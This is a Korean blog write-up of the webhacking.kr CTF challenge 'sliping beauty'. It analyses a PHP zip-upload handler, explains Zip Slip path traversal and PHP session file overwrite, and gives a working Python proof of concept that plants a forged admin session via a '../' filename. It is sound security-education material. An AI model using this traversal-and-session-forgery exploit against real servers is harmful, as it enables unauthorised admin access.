---
title: '[Webhacking.kr] sliping beauty'
author: hoppi
date: 2023-03-01 01:10:00 + 0000
categories: [Web]
tags: [web, zip_slip, php]
---

오랜만에 `webhacking.kr`에 들어가서 좀 예전에 나왔던 새로운(??) 문제들을 몇 문제 풀어보았습니다. 1.5년 전만 하더라도 그 문제들을 보면서 `어떻게 풀라는 거지?`라는 생각 밖에 못했는데 이제는 그 정도는 아닌 것 같네요. 아무튼 그 중에서 오랜만에 마주친 개념을 포함한 `sliping beauty` 롸업을 적어보려고 합니다.  

# 코드 분석
***
먼저 세션의 `uid`가 `admin`이면 플레그를 출력합니다. 사용자가 `zip` 파일을 올리면 추출한 파일들에 난수를 붙여서 `./upload/` 디렉토리에 `copy`합니다.  
```php
<?php
session_start();
if(!$_SESSION['uid']) $_SESSION['uid'] = "guest";
if($_SESSION['uid'] == "admin") include "/flag";
if($_FILES['upload']){
  $path = $_FILES['upload']['tmp_name'];
  $zip = new ZipArchive;
  if ($zip->open($_FILES['upload']['tmp_name']) === true){
    for($i = 0; $i < $zip->numFiles; $i++){
      $filename = $zip->getNameIndex($i);
      $filename_ = $filename.rand(10000000,99999999);
      if(strlen($filename) > 240) exit("file name too long");
      if(preg_match('/[\x00-\x1F\x7F-\xFF]/',$filename)) exit("no hack");
      if(copy("zip://{$_FILES['upload']['tmp_name']}#{$filename}", "./upload/{$filename_}")) echo "{$filename_} uploaded.<br>";
      else echo "{$filename_} upload failed.<br>";
    }
    $zip->close();
  }
}
highlight_file(__FILE__);
?>
```
<br/>

# 취약점
***
## Zip Slip
***
`Zip slip`은 `path traversal`구문을 가지는 파일을 포함한 `zip`, `tar` 등을 추출할 때 이를 이용하여 공격자가 의도한 경로로 원하는 파일을 덮어쓰거나 업로드하는 공격 방식입니다. 이 문제에서는 `preg_match()`를 이용해서 `filename`을 검사하지만 `../` 은 필터링하지 않습니다.  

## PHP Session Overwrite
***
위의 `zip slip`을 이용하면 임의의 위치에 파일을 업로드할 수 있으므로 원하는 세션을 만들어낼 수 있습니다. `PHP`는 직렬화된 포멧으로 `/var/lib/php/sessions/`에 세션파일을 저장합니다. 그리고 그 파일의 포멧은 `session_[PHPSESSID]`와 같습니다. 세션파일에 저장하는 값은 아래와 같이 간단하게 쉘에서 확인할 수 있습니다. `session_encode()`를 찍어보면 직렬화된 세션 데이터를 얻을 수 있습니다. (여기서 `session_start()`는 가장 위에 선언해줘야합니다. 코드를 몇개 적고 중간에 적어주게 되면 에러가 발생합니다🙃)  
![session](../../../assets/img/2023-03-01/session.png){: w="700" h="350" }  
<br/>

# Exploit
***
다음과 같은 시나리오를 구성할 수 있습니다.  

1. 직렬화된 데이터를 포함한 `aasdasdsd/../../../../../../../../var/lib/php/sessions/sess_`파일을 압축하여 업로드 
2. `sess_` 뒤에 랜덤한 숫자가 붙기 때문에 이 숫자가 `PHPSESSID`가 됩니다.
3. 이 랜덤한 숫자로 쿠키의 `PHPSESSID` 값을 바꿔줍니다.
<br/>

## PoC Code
***
그냥 파일이름에 `../`을 포함시키려고 맥북에서는 `/`를 `:`로 바꾸더라구요. 결국 방법을 찾지 못해서 어차피 PoC 코드로 적어야 할 겸 다른 ctf 문제에서 사용한 zip 파일 업로드 코드를 이용했습니다. ㅋㅅㅋ  
```python
from requests import post,get
from re import search
from io import BytesIO
import zipfile

info = lambda x: print(f'[+] {x}')
URL = 'http://webhacking.kr:10015'

PAYLOAD = 'uid|s:5:"admin";'

fh = BytesIO()
with zipfile.ZipFile(fh, "a", zipfile.ZIP_DEFLATED, False) as zf:
    zf.writestr("hacked/../../../../../../../../var/lib/php/sessions/sess_", PAYLOAD)

## Get Cookie
res = get(f"{URL}/")
COOKIE = {"PHPSESSID":res.headers['Set-Cookie'][:-7].split("PHPSESSID=")[1]}

## Zip file upload
res = post(f"{URL}/", files={"upload": ('hoppi.zip', fh.getvalue())}, cookies=COOKIE)
if "failed" in res.text.split("<br>")[0]:
    print(f"[-] Failed to upload zip file...")
else:
    info(res.text.split("<br>")[0])

NEW_SESSID = res.text.split("sess_")[1].split(" uploaded.")[0]
info (f"New PHPSESSID is {NEW_SESSID}")
NEW_COOKIE = {"PHPSESSID":NEW_SESSID}
res = get (f"{URL}/",cookies=NEW_COOKIE)

## Get flag
m = search(r"FLAG{.*?}",res.text)

if m:
    FLAG = m.group()
    info(f'Flag is {FLAG}')
else :
    print("[-] Failed to find the flag")
```
{: file='exploit.py'}
<br/>

# Reference
***
- [https://blog.christophetd.fr/write-insomnihack-2018-ctf-teaser/](https://blog.christophetd.fr/write-insomnihack-2018-ctf-teaser/)
- [https://ctftime.org/writeup/33611](https://ctftime.org/writeup/33611)
- [https://www.hahwul.com/cullinan/zip-slip/](https://www.hahwul.com/cullinan/zip-slip/)